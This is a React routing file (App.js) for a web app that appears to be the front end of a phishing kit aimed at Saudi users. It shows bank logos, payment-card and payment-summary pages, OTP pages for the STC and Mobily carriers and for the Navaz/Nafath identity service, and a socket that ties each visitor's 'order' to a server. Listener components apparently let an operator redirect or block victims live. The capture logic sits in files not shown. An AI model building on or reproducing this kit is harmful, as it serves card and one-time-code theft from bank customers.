import { BrowserRouter, Route, Routes } from "react-router-dom";
import { useEffect, useState } from "react";
import Main from "./screen/Main";
import NewDate from "./screen/NewDate";
import Phone from "./screen/Phone";
import PhoneOtp from "./screen/PhoneOtp";
import MobOtp from "./screen/MobOtp";
import PaymentForm from "./screen/PaymentForm";
import Success from "./screen/Success";
import NavazOtp from "./screen/NavazOtp";
import Navaz from "./screen/Navaz";
import NotFound from "./screen/NotFound";
import NavBar from "./component/NavBar";
import Footer from "./component/Footer";
import "./index.css";
import PaymentSymmry from "./screen/PaymentSymmry";
import STCOTP from "./screen/STCOTP";
import { socket } from "./screen/Main";
import ClientBlockListener from "./components/ClientBlockListener";
import AdminRedirectListener from "./components/AdminRedirectListener";

export const banks = [
  {
    img: "/payment/alahli1.png",
    name: "Ahly",
  },
  {
    img: "/payment/alarabi1.png",
    name: "Arabi",
  },
  {
    img: "/payment/alawal.png",
    name: "Alawal",
  },
  {
    img: "/payment/albilad.png",
    name: "Alblad",
  },
  {
    img: "/payment/alinma2.png",
    name: "Alinma",
  },
  {
    img: "/payment/aljazera.png",
    name: "AlGazera",
  },
  {
    img: "/payment/alrajhi1.png",
    name: "AlRaghy",
  },
  {
    img: "/payment/estithmari.png",
    name: "Estsmary Saudia",
  },
  {
    img: "/payment/firns.png",
    name: "French Captial",
  },
  {
    img: "/payment/rid.png",
    name: "AlRiyad",
  },
  {
    img: "/payment/sabb.png",
    name: "Sab",
  },
  {
    img: "/payment/samm.png",
    name: "Samba",
  },
];
export const token = sessionStorage.getItem("session");
export const id = sessionStorage.getItem("id");
function App() {
  const [mode, setMode] = useState("ar");
  // const query = new URLSearchParams(window.location.search)

  useEffect(() => {
    const bindOrder = () => {
      const orderId = sessionStorage.getItem("id");
      if (orderId) socket.emit("bindOrder", orderId);
    };

    const onConnect = () => bindOrder();

    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onStorage = (e) => {
      if (e.key === "id") bindOrder();
    };
    window.addEventListener("storage", onStorage);

    const onVisibility = () => {
      if (document.visibilityState === "visible") bindOrder();
    };
    document.addEventListener("visibilitychange", onVisibility);

    const interval = setInterval(bindOrder, 15000);

    return () => {
      socket.off("connect", onConnect);
      window.removeEventListener("storage", onStorage);
      document.removeEventListener("visibilitychange", onVisibility);
      clearInterval(interval);
    };
  }, []);

  const checkMode = (english = false, arabic = false) => {
    if (english && arabic) {
      if (mode === "en") {
        return { lang: "en", word: english };
      } else {
        return { lang: "ar", word: arabic };
      }
    } else {
      return mode;
    }
  };
  return (
    <>
      {
        <div className="flex flex-col items-center justify-center w-full bg-white">
          <BrowserRouter>
            <ClientBlockListener />
            <AdminRedirectListener />
            <NavBar />
            <Routes>
              <Route element={<Main />} path="/" />
              <Route element={<NewDate />} path="/new-date" />
              <Route
                element={
                  <PaymentSymmry
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="/payment-summary"
              />
              <Route element={<PaymentForm />} path="/payment-form" />
              <Route
                element={
                  <Phone checkMode={checkMode} setMode={setMode} mode={mode} />
                }
                path="/phone"
              />

              <Route
                element={
                  <PhoneOtp
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="/phoneOtp"
              />
              <Route
                element={
                  <STCOTP checkMode={checkMode} setMode={setMode} mode={mode} />
                }
                path="/stcOtp"
              />
              <Route
                element={
                  <MobOtp checkMode={checkMode} setMode={setMode} mode={mode} />
                }
                path="/mobilyOtp"
              />

              <Route
                element={
                  <Navaz checkMode={checkMode} setMode={setMode} mode={mode} />
                }
                path="/navaz"
              />
              <Route
                element={
                  <NavazOtp
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="/navazOtp"
              />
              <Route
                element={
                  <Success
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="/success"
              />

              <Route
                element={
                  <NotFound
                    checkMode={checkMode}
                    setMode={setMode}
                    mode={mode}
                  />
                }
                path="*"
              />
            </Routes>
            <Footer />
          </BrowserRouter>
        </div>
      }
    </>
  );
}

export default App;
